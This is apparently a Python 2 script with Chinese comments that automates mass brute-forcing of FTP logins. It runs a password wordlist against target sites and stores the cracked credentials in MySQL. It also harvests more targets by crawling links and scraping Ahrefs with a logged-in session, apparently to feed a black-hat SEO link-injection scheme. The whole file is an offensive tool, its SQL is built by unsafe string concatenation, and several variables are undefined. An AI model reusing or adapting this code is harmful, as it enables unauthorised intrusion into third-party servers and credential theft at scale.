#!/usr/local/bin/python
#-*- coding: UTF-8 -*-
##################################################################
import os
from ftplib import FTP
from collections import defaultdict, deque
import time #获取时间和延时
import threading as thread  # 导入线程模块
import socket,re
import ftpscan
import HashMD5 as Hash
import cookielib
import urllib2
import urllib
import mysql
import math

socket.setdefaulttimeout(20)
ftp_crack_in_lock = thread.RLock()
ftp_crack_out_lock = thread.RLock()
success_ftp_lock = thread.RLock()
ahrefs_get_in_lock = thread.RLock()
ahrefs_get_out_lock = thread.RLock()
find_link_in_lock = thread.RLock()
find_link_out_lock = thread.RLock()
sql_lock = thread.RLock()

######################################################################
# 定义全局变量
ftp_crack_in = deque()           # 要破解的url接收位置
ftp_crack_out = []        # 破解完以后的FTP要放入到数据库

ahrefs_get_in = []        # ahrefs 反链从数据库接收过来
ahrefs_get_out = []     # 反链以后返回给数据库

find_link_in = deque()            # 从数据库中去获取破解成功的内容
find_link_out = []         # 获取到链接以后加入到数据库中

ftp_wait_cnt = 0
ftp_wait_lock = thread.RLock()

ahrefs_wait_cnt = 0
ahrefs_wait_lock = thread.RLock()

find_link_wait_cnt = 0
find_link_wait_lock = thread.RLock()

######################################################################

def decode(password=""):
    result = []
    for i in range(0, len(password)/2):
	pass_gao = password[i * 2]
	pass_di = password[i * 2 + 1]
        if(pass_di > '9' or i == 0 or  pass_gao == '2'):
	    result.append(pass_di)
	elif (pass_gao == '1'):
	    result.append(str(int(result[i - 1]) - int(pass_di)))
	elif(pass_gao == '0'):
	   result.append(str(int(result[i - 1]) + int(pass_di)))
	else:
	    return ""
    new_password = ""
    for item in result:
	new_password = new_password + item 
    return new_password

def get_root_link(url):
    try_times = 0
    while(try_times < 3):
        try:
            web_content = urllib.urlopen(url).read()
            href_re = re.compile(r'(<a[^>]*?href=("|\'))(http://[^/]*?)((/)?("|\').*?>)', re.I|re.S)
            target = href_re.findall(web_content)   # 只要首页链接，其他一概不要
            break
        except:
            try_times = try_times + 1
            continue
    result = []
    for item_list in target:
	item = item_list[2]
	# 首先去除掉我们不想要的部分
	if(item.find(".gov.cn") != -1 or item.find(".edu.cn") != -1):
	    continue
	# 取出掉IP 加端口号的类型
	ip_re = re.compile(r"^(\d|:|\.)+$", re.I|re.S)
	if(ip_re.match(item) != None):
	    continue
	url_ssdomain = get_ssdomain(url[len("http://"):])
	if(item.find(url_ssdomain) != -1):   #排除2级域名
	    continue
        result.append(new_msg)
    print  u"获取",url,u"链接结束,获取",len(result),u"个url"
    return result
#############################################################################################################
# 0号线程响应配置文件修改的线程. 负责解析配置文件。如果配置文件有做修改的话。就重新解析配置文件。
#############################################################################################################
class config_thread(thread.Thread):
    def __init__(self, i):
	thread.Thread.__init__(self)    # 默认初始化
	self.thread_id = i
	pass
    def run(self):
	while(1):
	    global link_times,link_timeout,getlink_deny,ahrefs_max_domain,ahrefs_user,ahrefs_pass,stop,ahrefs_max,config_md5_value
	    if(stop == 1):
		break
	    hash_class = Hash.HashMD5()
	    new_md5_value = hash_class.get_hash("config.ini")
	    if(new_md5_value == config_md5_value):
		time.sleep(60)         # 配置文件不变就休眠一分钟
		continue
	    config = ConfigParser.ConfigParser()
	    # config.ini 文件本身就包含了FTP破解，反链，和获取连接
	    config.readfp(open("config.ini"))
	    # FTP 破解部分
	    link_times = int(config.get("FTP_CRACK","link_times"))
	    link_timeout = int(config.get("FTP_CRACK","link_timeout"))
	    socket.setdefaulttimeout(link_timeout)                 # 设置FTP连接超时时间
	    # 获取链接部分代码 
	    getlink_deny = config.get("GET_LINK","deny")
	    # ahrefs 反链部分
	    ahrefs_max_domain = int(config.get("ahrefs","max_domain"))
	    print u"新的ahrefs_max_domain 为",ahrefs_max_domain
	    ahrefs_user = config.get("ahrefs", "user")
	    ahrefs_pass = decode(config.get("ahrefs", "pass"))
	    ahrefs_max = int(config.get("ahrefs", "ahrefs_max"))
	    # 总开关
	    stop = int(config.get("STOP", "stop"))
	    config_md5_value = new_md5_value
	    if(stop == 1):
		print u"程序暂停工作.退出"
		break                      # 通知别人停止，自己也要停止
        pass
#############################################################################################################

#############################################################################################################
# 获取反链多线程部分
##############################################################################################################
class ahrefs_thread(thread.Thread):
    def __init__(self, i):
	thread.Thread.__init__(self)    # 默认初始化
	self.thread_id = i
	pass
    def run(self):
	ahrefs_link = Ahrefs(self.thread_id)
	ahrefs_link.begin_ahrefs()
        pass
class  Ahrefs:
    def __init__(self, i):
	self.thread_id = i
	pass
    def begin_ahrefs(self):
	global ftp_thread_cnt,stop,ahrefs_thread_cnt, ahrefs_get_in,ahrefs_get_out,ahrefs_wait_cnt
	if(self.thread_id == ftp_thread_cnt + 2):  # 102
	    while(1):
		if(stop == 1):
		    # 把没做完的事情还回去。取出来的东西可以先不用。
		    if(len(ahrefs_get_in) == 0 and ahrefs_wait_cnt == ahrefs_thread_cnt):   # 要等底下的线程把事情都做完了。守护线程才可以退出来。要再加个条件判断其他子线程做完了
			if(len(ahrefs_get_out) > 0):  # 存回数据库
			    ahrefs_get_out_lock.acquire()       # 可加锁可不加锁
			    sql_lock.acquire()
			    for ahrefs_url in ahrefs_get_out:
			        sql_class.mysql_exec("insert into url(url) values('"+ahrefs_url+"')")
			    sql_lock.release()
			    ahrefs_get_out_lock.release()
		        break
	        else:
		    if(len(ahrefs_get_in) < ahrefs_thread_cnt):  # 小于线程数就去进货
			ahrefs_get_in_lock.acquire()
			query_cnt = 5 * ahrefs_thread_cnt - len(ahrefs_get_in)
			sql_str = "select url from black_domain where been_ahrefed=0 limit "+ str(query_cnt)           # ftp_crack_in 的最大库存为5倍线程数.不够几个补几个。pr等于11表示未破解过		
			sql_lock.acquire()
			result_list = sql_class.mysql_select(sql_str)
			sql_lock.release()
			if(result_list == False):
			    ahrefs_get_in_lock.release()
			else:
			    # 这里也要对收到的东西做一个调整
			    for item in result_list:
				ahrefs_get_in.append("https://ahrefs.com/site-explorer/refdomains/subdomains/"+item[0]+"/")			    
			    ahrefs_get_in_lock.release()
			    sql_lock.acquire()
			    for result in result_list:
				sql_str = "update black_domain set been_ahrefed = 1 where url='"+str(result[0])+"'"   # 告诉查询表。这个是做过破解的
				sql_class.mysql_exec(sql_str)
			    sql_lock.release()
	            if(len(ahrefs_get_out) > 100):  # 大于100就存货
			ahrefs_get_out_lock.acquire()
			sql_lock.acquire()
			while(len(ahrefs_get_out) > 0):
			    result = ahrefs_get_out.pop()
			    sql_str = "insert into url(url) values('%s')"%(result)
			    sql_class.mysql_exec(sql_str)
			sql_lock.release()
			ahrefs_get_out_lock.release()
		    time.sleep(30)
	else:
	    # 第一步登录
	    post_url = "https://ahrefs.com/users/login.php"
	    data = {'email':ahrefs_user, 'password':ahrefs_pass}
	    ckjar = cookielib.CookieJar()
	    req = urllib2.Request(post_url)
	    data = urllib.urlencode(data)
	    opener=urllib2.build_opener(urllib2.HTTPCookieProcessor(ckjar))
	    try:
		response = opener.open(req, data)
		content = response.read()
	    except Exception,e:
		print e
		return
	    try_times = 0
	    while (1):
		ahrefs_get_in_lock.acquire()
		try:
		    url = ahrefs_get_in.pop()
		    trytimes = 0
		    ahrefs_get_in_lock.release()
		except:
		    ahrefs_get_in_lock.release()
		    if(stop == 1):
			ahrefs_wait_lock.acquire()
			ahrefs_wait_cnt = ahrefs_wait_cnt + 1
			ahrefs_wait_lock.release()
			print u"反链退出",self.thread_id
			break
		    else:
			time.sleep(10)
			continue
		try:
		    response = opener.open(url)
		    content = response.read()
		except Exception,e:
		    print e
		    continue
		if(re.compile("/images/icons/warning-big.gif",re.I|re.S).search(content) != None):
		    hour = int(time.strftime('%H',time.localtime(time.time())))
		    ahrefs_get_in_lock.acquire()
                    ahrefs_get_in.append(url)
                    ahrefs_get_in_lock.release()          # 还回去。陷入休眠
		    sleep_time = ((19 - hour)%24) * 60 * 60           # 沉睡这么多个小时以后再接着
                    time.sleep(sleep_time_time)
		    continue
		target_str = "(?<=title=\"Open in a new tab:\s).*?(?=\")"
		target_re = re.compile(target_str, re.I|re.S)
		find_text = target_re.findall(content)
		if(find_text == []):
		    continue
		ahrefs_get_out_lock.acquire()
		for node in find_text:
		    ahrefs_get_out.append(node)
		ahrefs_get_out_lock.release()
		if(url[len(url) - 1] == "/"):
		    count_str = re.compile("<strong>((\d|,)+?)</strong>\s+?results\s+?</p>", re.I|re.S)
		    try:
			count_num = count_str.findall(content)[0][0]
		    except Exception,e:
			print e
			count_num = -1
			continue
		    count_num = int(str(count_num).replace(",", ""))
		    if(count_num >= 3000):
			continue
		    if(count_num != -1):
			page_num = int(math.ceil(float(count_num)/50))     # 算出来总的需要的页面数
			for i  in range(2, page_num+1):
			    new_insert = url + str(i)
			    ahrefs_get_in_lock.acquire()
			    ahrefs_get_in.append(new_insert)
			    ahrefs_get_in_lock.release()
#############################################################################################################

#############################################################################################################
#
#############################################################################################################
# 多线程任务
class find_link_thread(thread.Thread):
    def __init__(self, i):
	thread.Thread.__init__(self)    # 默认初始化
	self.thread_id = i
	self.msg_content = ""
	pass
    def run(self):
	global find_link_in,find_link_out,ftp_thread_cnt,ahrefs_thread_cnt,find_link_wait_cnt,getlink_thread_cnt
	self.msg_content = ""
	if(self.thread_id == ftp_thread_cnt +ahrefs_thread_cnt + 3):     # 100 + 3 + 3 = 106
	    while(1):
		if(stop == 1):
		    # 把没做完的事情还回去。取出来的东西可以先不用。
		    if(len(find_link_in) == 0 and find_link_wait_cnt == getlink_thread_cnt ):   # 要等底下的线程把事情都做完了。守护线程才可以退出来。要再加个条件判断其他子线程做完了
			if(len(find_link_out) > 0):  # 存回数据库
			    find_link_out_lock.acquire()       # 可加锁可不加锁
			    sql_lock.acquire()
			    for get_url in find_link_out:
			        sql_class.mysql_exec("insert into black_domain(url) values('"+get_url+"')")
			    sql_lock.release()
			    find_link_out_lock.release()
		        break
	        else:
		    if(len(find_link_in) < getlink_thread_cnt):  # 小于100就去进货
			find_link_in_lock.acquire()
			query_cnt = 5 * getlink_thread_cnt - len(ftp_crack_in)
			sql_lock.acquire()
			sql_str = "select url from ftp_msg where get_linked=0 limit "+ str(query_cnt)           # find_link_in 的最大库存为500.不够几个补几个。get_link = 0 表示为获取过页面链接
			result_list = sql_class.mysql_select(sql_str)
			sql_lock.release()
			if(result_list != False):
			    # 对于获取到的ftp_msg 信息重新做一个
			    for item in result_list:
				find_link_in.append(item[0])
			    find_link_in_lock.release()
			    sql_lock.acquire()
			    for result in result_list:
				sql_str = "update ftp_msg set get_linked = 1 where url='"+str(result[0])+"'"   # 告诉查询表。这个是做过破解的
				sql_class.mysql_exec(sql_str)
			    sql_lock.release()
			    pass
			else:
			    find_link_in_lock.release()
	            if(len(find_link_out) > 100):  # 大于100就存货
			find_link_out_lock.acquire()
			sql_lock.acquire()
			while(len(find_link_out) > 0):
			    result = find_link_out.pop()
			    sql_str = "insert into black_domain(url) values('%s')"%(result)
			    sql_class.mysql_exec(sql_str)
			sql_lock.release()
			find_link_out_lock.release()
		    time.sleep(10)
	    pass	    
	else:
	    while(1):
		find_link_in_lock.acquire()
		try:
		    self.msg_content = find_link_in.pop()
		except:
		    find_link_in_lock.release()
		    if(stop == 1):
			print u"获取连接退出",self.thread_id
			find_link_wait_lock.acquire()
			find_link_wait_cnt = find_link_wait_cnt + 1
			find_link_wait_lock.release()
			break
		    time.sleep(10)
		    continue
		find_link_in_lock.release()
		result = get_root_link(self.msg_content)
		if(result == False):
		    continue
		find_link_out_lock.acquire()
		for item in result:
		    find_link_out.append(item)
		find_link_out_lock.release()
        pass
#############################################################################################################

class Ftp_Scan_Thread(thread.Thread):
    def __init__(self, i):
	thread.Thread.__init__(self)    # 默认初始化
	self.thread_id = i
	self.msg_content = ""
	self.sleep_time = 10
	self.crack_result = ""
	pass
    def run(self):
	global ftp_crack_in,sql_class,ftp_thread_cnt,ftp_wait_cnt,link_timeout,link_times,ftp_crack_out
	if(self.thread_id == 1):   # FTP crack 守护进程
	    while(1):
		if(stop == 1):
		    # 把没做完的事情还回去。取出来的东西可以先不用。
		    if(len(ftp_crack_in) == 0 and ftp_wait_cnt == ftp_thread_cnt):   # 要等底下的线程把事情都做完了。守护线程才可以退出来。要再加个条件判断其他子线程做完了
			if(len(ftp_crack_out) > 0):  # 存回数据库
			    sql_lock.acquire()
			    for ftp_msg in ftp_crack_out:
				sql_str = "insert into ftp_msg(username,passwd,url,cwd,PR) values('%s','%s','%s','%s','%s')"%(ftp_msg[0],ftp_msg[1],ftp_msg[2],ftp_msg[3],ftp_msg[4])
			        sql_class.mysql_exec(sql_str)
		            sql_lock.release()
		        break
	        else:
		    if(len(ftp_crack_in) < ftp_thread_cnt):  # 小于100就去进货
			ftp_crack_in_lock.acquire()
			query_cnt = 5 * ftp_thread_cnt - len(ftp_crack_in)
			sql_lock.acquire()
			sql_str = "select url from url where been_ftped=0 limit "+ str(query_cnt)           # ftp_crack_in 的最大库存为500.不够几个补几个。pr等于11表示未破解过
			result_list = sql_class.mysql_select(sql_str)
			sql_lock.release()
			if(result_list == False):
			    ftp_crack_in_lock.release()
			else:
			    # result_list 还是要再做一下加工
			    for item in result_list:
				ftp_crack_in.append((item[0],0))
			    ftp_crack_in_lock.release()
			    sql_lock.acquire()
			    for result in result_list:
				sql_str = "update url set been_ftped = 1 where url='"+str(result[0])+"'"   # 告诉查询表。这个是做过破解的
				sql_class.mysql_exec(sql_str)
			    sql_lock.release()
			    pass
	            if(len(ftp_crack_out) > 0):  # 大于0就存货
			ftp_crack_out_lock.acquire()
			sql_lock.acquire()
			for crack_result in ftp_crack_out:
			    sql_str = "insert into ftp_msg(username,passwd,url,cwd,PR) values('%s','%s','%s','%s','%s')"%(crack_result[0],crack_result[1],crack_result[2],crack_result[3],crack_result[4])
			    sql_class.mysql_exec(sql_str)
			sql_lock.release()
			ftp_crack_out_lock.release()
		    time.sleep(20)
        else:
	    password = [p.replace('\n','') for p in open('password.dic').readlines()]	    
	    while(1):
	        self.msg_content = ()
	        ftp_crack_in_lock.acquire()
	        try:
		    self.msg_content = ftp_crack_in.popleft()
		    self.sleep_time = 10
	        except:
		    ftp_crack_in_lock.release()
		    if(stop == 1):
			ftp_wait_lock.acquire()
			ftp_wait_cnt = ftp_wait_cnt + 1
			ftp_wait_lock.release()
			print  u"FTP 退出",self.thread_id
			break
		    time.sleep(30)   # 拿不到就休眠三十秒钟。
	            continue		
	        ftp_crack_in_lock.release()
	        ftp_crack_class = ftpscan.PythonFtpScanner(self.msg_content[0], link_times,link_timeout, password,self.msg_content[1])
	        self.crack_result = ftp_crack_class.ftp_begin_crack()
	        if(self.crack_result != False and self.crack_result != None and self.crack_result != "fail"):
		    # result 格式是 abc:abc@abc.com/#|2
		    print u"破解成功"
		    ftp_crack_out_lock.acquire()
		    ftp_crack_out.append(self.crack_result)
		    ftp_crack_out_lock.release()
		elif(self.crack_result == "fail"):
		    ftp_crack_in_lock.acquire()
		    self.msg_content[1] = self.msg_content[1]+2
		    print u"破解失败,压入队列"
		    ftp_crack_in.append(self.msg_content)
		    ftp_crack_in_lock.release()
		
#################################################################################################################

# 读取配置文件
import ConfigParser
# 第一步要计算出配置文件的MD5 值
hash_class = Hash.HashMD5()
config_md5_value = hash_class.get_hash("config.ini")

config = ConfigParser.ConfigParser()
# config.ini 文件本身就包含了FTP破解，反链，和获取连接
config.readfp(open("config.ini"))
# FTP 破解部分
ftp_thread_cnt = int(config.get("FTP_CRACK","crack_thread"))
link_times = int(config.get("FTP_CRACK","link_times"))
link_timeout = int(config.get("FTP_CRACK","link_timeout"))
socket.setdefaulttimeout(link_timeout)                 # 设置FTP连接超时时间
# 获取链接部分代码 
getlink_thread_cnt = int(config.get("GET_LINK","thread"))
getlink_deny = config.get("GET_LINK","deny")
# ahrefs 反链部分
ahrefs_thread_cnt = int(config.get("ahrefs", "thread"))
ahrefs_max_domain = int(config.get("ahrefs","max_domain"))
ahrefs_user = config.get("ahrefs", "user")
ahrefs_pass = decode(config.get("ahrefs", "pass"))
ahrefs_max = int(config.get("ahrefs", "ahrefs_max"))
# 总开关
stop = int(config.get("STOP", "stop"))
# 数据库信息
sql_server = config.get("DATA", "Server")
sql_user = config.get("DATA", "Username")
sql_pass = config.get("DATA", "password")
sql_db = config.get("DATA", "db")

# 数据库连接
sql_class = mysql.mysql_xwq(sql_server,sql_user,sql_pass,sql_db)
sql_class.mysql_open()
# 计算总的线程数量。
total_thread = ftp_thread_cnt +1 + getlink_thread_cnt + 1 + ahrefs_thread_cnt + 1+1       # 每个任务都要配一个守护进程。总的还要配一个守护进程。用来解析各个线程

# 假设 ftp_thread_cnt = 100 getlink_thread_cnt = 3 ahrefs_thread_cnt = 3 则 0号为守护线程。1号为FTP守护线程。2-101 为FTP线程。102为ahrefs守护线程
# 103-105 为反链线程。106 为getlink 守护线程。107-109 为获取连接线程。

thread_set = []

# 支持从文本导入到数据库
start = time.clock()
if(os.path.exists("url.txt")):
    url_fp = open("url.txt","r")
    url_content = [v.strip() for v in url_fp.readlines()]
    url_fp.close()
    sql_class.conn.begin()        # 开始事务
    i = 0
    sql_str = ""
    for item in url_content:
	i = i +1
	sql_str = sql_str + "insert into url(url) values('%s') on duplicate key update url='%s';"%(item,item)
	
	if(i % 1000 == 0 or i == len(url_content)):
	    sql_class.conn.begin()
	    sql_class.mysql_exec(sql_str)
	    while sql_class.cursor.nextset(): pass
	    sql_class.conn.commit()
	    sql_str = ""
end = time.clock()

print end - start

if(os.path.exists("ftp.txt")):
    ftp_fp = open("ftp.txt","r")
    ftp_content = [v.strip() for v in ftp_fp.readlines()]
    ftp_fp.close()
    import ftp_dev
    ftp_dev_class = ftp_dev.BlackLink()
    for item in ftp_content:
	url = ftp_dev_class.get_url_from_msg(item)
	username = ftp_dev_class.get_user_from_msg(item)
	passwd = ftp_dev_class.get_passwd_from_msg(item)
	cwd = ftp_dev_class.get_cwd_from_msg(item)
	pr_value = ftp_dev_class.get_pr_from_msg(item)
	sql_str = "insert into ftp_msg(url,username,passwd,cwd,PR) values('"+url+"','"+username+"','"+passwd+"','"+cwd+"',"+str(pr_value)+")"
	sql_class.mysql_exec(sql_str)

if(os.path.exists("black.txt")):
    black_fp = open("black.txt","r")
    black_content = [v.strip() for v in black_fp.readlines()]
    black_fp.close()
    for item in black_content:
	sql_str = "insert into black_domain(url) values('%s')"%(item)
	sql_class.mysql_exec(sql_str)
	
start = time.clock()
for i in range(0,total_thread):        # 153
    if(i == 0):   # 0号线程负责修改配置
	config_thread = config_thread(i)
	thread_set.append(config_thread)
	config_thread.start()
    # FTP 破解线程
    elif (i >= 1 and i <= (ftp_thread_cnt + 1)):  # ftp_thread_cnt 假设为50.那就是 1-101
        crack_thread = Ftp_Scan_Thread(i)
        thread_set.append(crack_thread)
        crack_thread.start()
	pass

    elif (i > (ftp_thread_cnt + 1) and i <= (ftp_thread_cnt +ahrefs_thread_cnt + 2)):   # 102-105
	ahrefs_get = ahrefs_thread(i)
	thread_set.append(ahrefs_get)
	ahrefs_get.start() 
	pass
    elif (i > (ftp_thread_cnt + ahrefs_thread_cnt + 2)): # find_link 线程
	getlink_thread = find_link_thread(i)
	getlink_thread.start()
	thread_set.append(getlink_thread)
	pass
for crack_thread in thread_set:
    crack_thread.join()

print  u"程序退出"